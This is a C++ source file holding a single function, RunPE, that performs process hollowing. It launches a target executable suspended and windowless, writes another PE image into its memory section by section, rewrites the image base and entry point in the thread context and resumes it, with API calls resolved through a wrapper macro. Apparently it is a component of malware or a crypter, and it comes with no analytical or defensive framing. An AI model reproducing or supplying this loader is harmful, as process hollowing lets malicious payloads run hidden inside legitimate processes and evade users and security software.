#include "core/Common.h"

BOOL RunPE(LPCSTR injectFilePath, void* fileBuffer)
{
	IMAGE_DOS_HEADER* DOSHeader = PIMAGE_DOS_HEADER(fileBuffer);
	IMAGE_NT_HEADERS* NtHeader = PIMAGE_NT_HEADERS(DWORD(fileBuffer) + DOSHeader->e_lfanew);
	IMAGE_SECTION_HEADER* SectionHeader;

	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;

	CONTEXT* CTX;

	DWORD* ImageBase; //Base address of the image
	void* pImageBase; // Pointer to the image base

	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) // Check if image is a PE File.
	{
		API(MSVCRT, memset)(&PI, 0, sizeof(PI));
		API(MSVCRT, memset)(&SI, 0, sizeof(SI));

		if (API(KERNEL32, CreateProcessA)(injectFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW,
			NULL, NULL, &SI, &PI))
		{
			// Allocate memory for the context.
			CTX = LPCONTEXT(API(KERNEL32, VirtualAlloc)(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL; // Context is allocated

			if (API(KERNEL32, GetThreadContext)(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
			{
				// Read instructions
				API(KERNEL32, ReadProcessMemory)(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);

				pImageBase = API(KERNEL32, VirtualAllocEx)(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

				// Write the image to the process
				API(KERNEL32, WriteProcessMemory)(PI.hProcess, pImageBase, fileBuffer, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

				for (int count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
				{
					SectionHeader = PIMAGE_SECTION_HEADER(DWORD(fileBuffer) + DOSHeader->e_lfanew + 248 + (count * 40));

					API(KERNEL32, WriteProcessMemory)(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
						LPVOID(DWORD(fileBuffer) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
				}
				API(KERNEL32, WriteProcessMemory)(PI.hProcess, LPVOID(CTX->Ebx + 8),
					LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);

				// Move address of entry point to the eax register
				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
				API(KERNEL32, SetThreadContext)(PI.hThread, LPCONTEXT(CTX));
				API(KERNEL32, ResumeThread)(PI.hThread);

				return TRUE;
			}
		}
	}
	return FALSE;
}